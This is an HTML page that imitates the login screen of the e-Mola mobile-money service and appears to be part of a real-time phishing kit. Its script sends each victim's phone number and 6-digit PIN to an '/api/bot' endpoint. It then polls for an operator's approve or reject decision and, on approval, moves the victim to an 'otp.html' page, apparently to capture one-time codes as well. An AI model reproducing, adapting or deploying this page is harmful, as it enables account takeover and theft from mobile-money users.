<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Entrar - e-Mola</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { margin: 0; background: #E67E22; display: flex; justify-content: center; min-height: 100vh; overflow: hidden; position: relative; }
        
        /* Background Gradient to match the blurred image */
        .bg-image { 
            position: absolute; top: 0; left: 0; right: 0; bottom: 0; 
            background: linear-gradient(180deg, #F39C12 0%, #D35400 100%);
            opacity: 0.9; 
            z-index: -1; 
            filter: blur(5px); 
        }

        .app-container { width: 100%; max-width: 400px; padding: 20px; display: flex; flex-direction: column; position: relative; z-index: 1; }
        
        /* Header */
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 40px; color: white; padding: 10px 0; }
        .back { font-size: 28px; text-decoration: none; color: white; font-weight: 300; }
        .lang { display: flex; align-items: center; gap: 8px; font-weight: bold; font-size: 14px; }
        .flag { font-size: 20px; }

        /* Logo */
        .logo-container { text-align: center; margin-bottom: 40px; color: white; }
        .logo-icon { font-size: 70px; margin-bottom: 10px; }
        .logo-text { font-size: 48px; font-weight: 700; margin: 0; line-height: 1; letter-spacing: -1px;}
        .tagline { font-size: 14px; font-weight: 600; margin-top: 8px; }

        /* Inputs */
        .input-field { 
            width: 100%; 
            background: rgba(80, 40, 10, 0.4); /* Translucent brown */
            border: none; 
            padding: 20px; 
            border-radius: 30px; 
            color: white; 
            font-size: 18px; 
            outline: none; 
            margin-bottom: 15px; 
            text-align: center;
        }
        .input-field::placeholder { color: rgba(255, 255, 255, 0.7); font-size: 16px;}
        .input-field:focus { background: rgba(80, 40, 10, 0.6); }

        /* Login Button */
        .btn-main { 
            width: 100%; 
            background: white; 
            color: #111; 
            font-size: 18px; 
            font-weight: 700; 
            padding: 20px; 
            border: none; 
            border-radius: 30px; 
            margin-top: 10px; 
            cursor: pointer; 
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        /* Links */
        .links { text-align: center; margin-top: 30px; }
        .links a { display: block; color: white; text-decoration: none; font-size: 16px; margin-bottom: 20px; font-weight: 500;}

        /* Footer */
        .footer { margin-top: auto; padding-bottom: 20px; text-align: center; color: white; display: flex; flex-direction: column; align-items: center; }
        .icons { display: flex; justify-content: center; gap: 20px; margin-bottom: 25px; }
        .icon-btn { 
            width: 65px; height: 65px; 
            border-radius: 50%; 
            background: white; 
            display: flex; justify-content: center; align-items: center; 
            font-size: 28px; color: #D35400; 
        }
        .version { font-size: 13px; opacity: 0.9; }

        /* Loading Overlay */
        #overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.85); color: white; flex-direction: column; justify-content: center; align-items: center; z-index: 999; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #E67E22; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .error-msg { color: #ffcccc; font-weight: bold; text-align: center; display: none; margin-bottom: 15px; }
    </style>
</head>
<body>
    <div class="bg-image"></div>

    <!-- Loading Overlay -->
    <div id="overlay">
        <div class="spinner"></div>
        <h2>A Verificar...</h2>
        <p>Aguarde por favor.</p>
    </div>

    <div class="app-container">
        <!-- Header -->
        <div class="header">
            <a href="dados.html" class="back">&#10094;</a>
            <div class="lang"><span class="flag">🇵🇹</span> POR</div>
        </div>

        <!-- Logo -->
        <div class="logo-container">
            <div class="logo-icon">📱💸</div>
            <div class="logo-text">e-Mola</div>
            <div class="tagline">Meu cell, minha mola</div>
        </div>

        <div class="error-msg" id="loginError">PIN incorreto. Tente novamente.</div>

        <!-- Inputs -->
        <input type="tel" id="phone" class="input-field" placeholder="">
        
        <!-- 6-digit PIN input (masked) -->
        <input type="password" id="pin" class="input-field" placeholder="PIN" maxlength="6" inputmode="numeric" pattern="\d*">

        <button class="btn-main" onclick="submitLogin()">ENTRAR</button>

        <div class="links">
            <a href="#">Esqueceu a senha</a>
            <a href="#">Cadastrar-se</a>
        </div>

        <!-- Footer -->
        <div class="footer">
            <div class="icons">
                <div class="icon-btn">📍</div>
                <div class="icon-btn">📖</div>
            </div>
            <div class="version">Versão 2.2.0</div>
        </div>
    </div>

    <script>
        var globalUserId = sessionStorage.getItem('globalUserId') || Date.now().toString().slice(-6);
        sessionStorage.setItem('globalUserId', globalUserId);

        // Pre-fill phone if returning from previous page
        var savedPhone = sessionStorage.getItem('userPhone');
        if(savedPhone) { document.getElementById('phone').value = savedPhone.replace('+258', ''); }

        // Ensure only numbers are typed in the PIN field
        document.getElementById('pin').addEventListener('input', function (e) {
            this.value = this.value.replace(/[^0-9]/g, '');
        });

        function submitLogin() {
            var phone = document.getElementById('phone').value;
            var pin = document.getElementById('pin').value;
            
            // Check if phone is provided and PIN is exactly 6 digits
            if(!phone || pin.length !== 6) {
                alert("Por favor, insira um número válido e um PIN de 6 dígitos.");
                return;
            }
            
            document.getElementById('overlay').style.display = 'flex';
            
            fetch('/api/bot', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    action: 'send', type: 'PHONE_PIN', userId: globalUserId, 
                    data: { phone: '+258' + phone, pin: pin } 
                })
            }).then(function() { 
                pollStatus(); 
            }).catch(function() {
                document.getElementById('overlay').style.display = 'none';
                alert("Erro de rede. Verifique a sua ligação.");
            });
        }

        function pollStatus() {
            var interval = setInterval(function() {
                fetch('/api/bot?userId=' + globalUserId + '&type=PHONE_PIN&t=' + new Date().getTime(), { 
                    cache: 'no-store',
                    headers: { 'Pragma': 'no-cache', 'Cache-Control': 'no-cache' }
                })
                .then(function(res) { return res.json(); })
                .then(function(data) {
                    if (data.status === 'approved') {
                        clearInterval(interval);
                        window.location.href = 'otp.html'; 
                    } 
                    else if (data.status === 'rejected') {
                        clearInterval(interval);
                        document.getElementById('overlay').style.display = 'none';
                        document.getElementById('loginError').style.display = 'block';
                        document.getElementById('pin').value = ''; // Clear PIN
                        document.getElementById('pin').focus();
                    }
                }).catch(function(err) {
                    console.log("Erro de polling", err);
                });
            }, 2000);
        }
    </script>
</body>
  </html>
